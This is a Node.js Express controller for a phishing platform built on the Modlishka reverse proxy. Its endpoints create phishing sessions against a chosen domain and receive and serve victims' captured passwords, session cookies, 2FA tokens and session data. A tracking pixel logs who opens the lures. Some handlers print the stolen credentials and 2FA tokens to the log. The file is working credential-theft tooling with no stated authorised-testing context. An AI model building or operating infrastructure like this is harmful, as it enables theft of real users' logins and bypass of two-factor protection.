const modlishkaService = require('../services/modlishkaService');

class ModlishkaController {
  /**
   * Create a new Modlishka phishing session
   */
  async createSession(req, res) {
    try {
      const { campaignId, targetDomain, options = {} } = req.body;
      
      if (!campaignId || !targetDomain) {
        return res.status(400).json({
          error: 'Campaign ID and target domain are required'
        });
      }
      
      // Validate target domain format
      const domainRegex = /^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$/;
      if (!domainRegex.test(targetDomain)) {
        return res.status(400).json({
          error: 'Invalid target domain format'
        });
      }
      
      console.log(`🎣 Creating Modlishka session for campaign ${campaignId}, target: ${targetDomain}`);
      
      const session = await modlishkaService.createPhishingSession(campaignId, targetDomain, options);
      
      res.status(201).json({
        success: true,
        message: 'Modlishka phishing session created successfully',
        session
      });
      
    } catch (error) {
      console.error('Error creating Modlishka session:', error);
      res.status(500).json({
        error: 'Failed to create phishing session',
        details: error.message
      });
    }
  }

  /**
   * Stop a Modlishka session
   */
  async stopSession(req, res) {
    try {
      const { sessionId } = req.params;
      
      await modlishkaService.stopSession(sessionId);
      
      res.json({
        success: true,
        message: 'Modlishka session stopped successfully'
      });
      
    } catch (error) {
      console.error('Error stopping Modlishka session:', error);
      res.status(500).json({
        error: 'Failed to stop session',
        details: error.message
      });
    }
  }

  /**
   * Get all active Modlishka sessions
   */
  async getActiveSessions(req, res) {
    try {
      const sessions = modlishkaService.getActiveSessions();
      
      res.json({
        success: true,
        sessions
      });
      
    } catch (error) {
      console.error('Error getting active sessions:', error);
      res.status(500).json({
        error: 'Failed to get sessions',
        details: error.message
      });
    }
  }

  /**
   * Get captured credentials for a session
   */
  async getCapturedCredentials(req, res) {
    try {
      const { sessionId } = req.params;
      
      const credentials = await modlishkaService.getCapturedCredentials(sessionId);
      
      res.json({
        success: true,
        credentials
      });
      
    } catch (error) {
      console.error('Error getting captured credentials:', error);
      res.status(500).json({
        error: 'Failed to get credentials',
        details: error.message
      });
    }
  }

  /**
   * Get captured cookies for a session
   */
  async getCapturedCookies(req, res) {
    try {
      const { sessionId } = req.params;
      
      const cookies = await modlishkaService.getCapturedCookies(sessionId);
      
      res.json({
        success: true,
        cookies
      });
      
    } catch (error) {
      console.error('Error getting captured cookies:', error);
      res.status(500).json({
        error: 'Failed to get cookies',
        details: error.message
      });
    }
  }

  /**
   * Get captured 2FA tokens for a session
   */
  async getCaptured2FA(req, res) {
    try {
      const { sessionId } = req.params;
      
      const tokens = await modlishkaService.getCaptured2FA(sessionId);
      
      res.json({
        success: true,
        tokens
      });
      
    } catch (error) {
      console.error('Error getting captured 2FA tokens:', error);
      res.status(500).json({
        error: 'Failed to get 2FA tokens',
        details: error.message
      });
    }
  }

  /**
   * Handle webhook data from Modlishka (credentials, cookies, 2FA)
   */
  async handleWebhook(req, res) {
    try {
      const { sessionId } = req.params;
      const { type, data } = req.body;
      
      console.log(`📥 Modlishka webhook received for session ${sessionId}, type: ${type}`);
      
      await modlishkaService.handleWebhookData(sessionId, type, {
        ...data,
        ip: req.ip,
        userAgent: req.get('User-Agent'),
        timestamp: new Date()
      });
      
      res.json({ success: true });
      
    } catch (error) {
      console.error('Error handling Modlishka webhook:', error);
      res.status(500).json({
        error: 'Failed to process webhook',
        details: error.message
      });
    }
  }

  /**
   * Handle credential captures from Modlishka
   */
  async handleCredentials(req, res) {
    try {
      const { campaignId } = req.params;
      const credentialData = req.body;
      
      console.log(`🔑 Credentials received for campaign ${campaignId}:`, credentialData);
      
      // Find the session token for this campaign
      const sessions = modlishkaService.getActiveSessions();
      const session = sessions.find(s => s.campaignId === parseInt(campaignId));
      
      if (session) {
        await modlishkaService.handleWebhookData(session.sessionToken, 'credentials', {
          ...credentialData,
          ip: req.ip,
          userAgent: req.get('User-Agent')
        });
      }
      
      res.json({ success: true });
      
    } catch (error) {
      console.error('Error handling credentials:', error);
      res.status(500).json({ error: 'Failed to process credentials' });
    }
  }

  /**
   * Handle cookie captures from Modlishka
   */
  async handleCookies(req, res) {
    try {
      const { campaignId } = req.params;
      const cookieData = req.body;
      
      console.log(`🍪 Cookies received for campaign ${campaignId}`);
      
      // Find the session token for this campaign
      const sessions = modlishkaService.getActiveSessions();
      const session = sessions.find(s => s.campaignId === parseInt(campaignId));
      
      if (session) {
        await modlishkaService.handleWebhookData(session.sessionToken, 'cookies', {
          ...cookieData,
          ip: req.ip,
          userAgent: req.get('User-Agent')
        });
      }
      
      res.json({ success: true });
      
    } catch (error) {
      console.error('Error handling cookies:', error);
      res.status(500).json({ error: 'Failed to process cookies' });
    }
  }

  /**
   * Handle 2FA token captures from Modlishka
   */
  async handle2FA(req, res) {
    try {
      const { campaignId } = req.params;
      const twoFAData = req.body;
      
      console.log(`🔐 2FA tokens received for campaign ${campaignId}:`, twoFAData);
      
      // Find the session token for this campaign
      const sessions = modlishkaService.getActiveSessions();
      const session = sessions.find(s => s.campaignId === parseInt(campaignId));
      
      if (session) {
        await modlishkaService.handleWebhookData(session.sessionToken, '2fa', {
          ...twoFAData,
          ip: req.ip,
          userAgent: req.get('User-Agent')
        });
      }
      
      res.json({ success: true });
      
    } catch (error) {
      console.error('Error handling 2FA tokens:', error);
      res.status(500).json({ error: 'Failed to process 2FA tokens' });
    }
  }

  /**
   * Handle session captures from Modlishka
   */
  async handleSessions(req, res) {
    try {
      const { campaignId } = req.params;
      const sessionData = req.body;
      
      console.log(`📱 Session data received for campaign ${campaignId}`);
      
      // Find the session token for this campaign
      const sessions = modlishkaService.getActiveSessions();
      const session = sessions.find(s => s.campaignId === parseInt(campaignId));
      
      if (session) {
        await modlishkaService.handleWebhookData(session.sessionToken, 'session', {
          ...sessionData,
          ip: req.ip,
          userAgent: req.get('User-Agent')
        });
      }
      
      res.json({ success: true });
      
    } catch (error) {
      console.error('Error handling session data:', error);
      res.status(500).json({ error: 'Failed to process session data' });
    }
  }

  /**
   * Handle tracking pixel for Modlishka sessions
   */
  async handleTracking(req, res) {
    try {
      const { sessionToken } = req.params;
      
      console.log(`📊 Tracking access for Modlishka session: ${sessionToken}`);
      
      // Log the access
      await modlishkaService.handleWebhookData(sessionToken, 'access', {
        ip: req.ip,
        userAgent: req.get('User-Agent'),
        referer: req.get('Referer'),
        timestamp: new Date()
      });
      
      // Return 1x1 transparent pixel
      const pixel = Buffer.from(
        'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
        'base64'
      );
      
      res.writeHead(200, {
        'Content-Type': 'image/png',
        'Content-Length': pixel.length,
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
      });
      
      res.end(pixel);
      
    } catch (error) {
      console.error('Error handling tracking:', error);
      res.status(500).json({ error: 'Failed to process tracking' });
    }
  }

  /**
   * Get Modlishka session statistics for a campaign
   */
  async getSessionStats(req, res) {
    try {
      const { campaignId } = req.params;
      
      const stats = await modlishkaService.getSessionStats(campaignId);
      
      res.json({
        success: true,
        stats
      });
      
    } catch (error) {
      console.error('Error getting session stats:', error);
      res.status(500).json({
        error: 'Failed to get session statistics',
        details: error.message
      });
    }
  }

  /**
   * Initialize Modlishka database tables
   */
  async initializeDatabase(req, res) {
    try {
      await modlishkaService.initializeDatabase();
      
      res.json({
        success: true,
        message: 'Modlishka database tables initialized successfully'
      });
      
    } catch (error) {
      console.error('Error initializing Modlishka database:', error);
      res.status(500).json({
        error: 'Failed to initialize database',
        details: error.message
      });
    }
  }
}

module.exports = new ModlishkaController();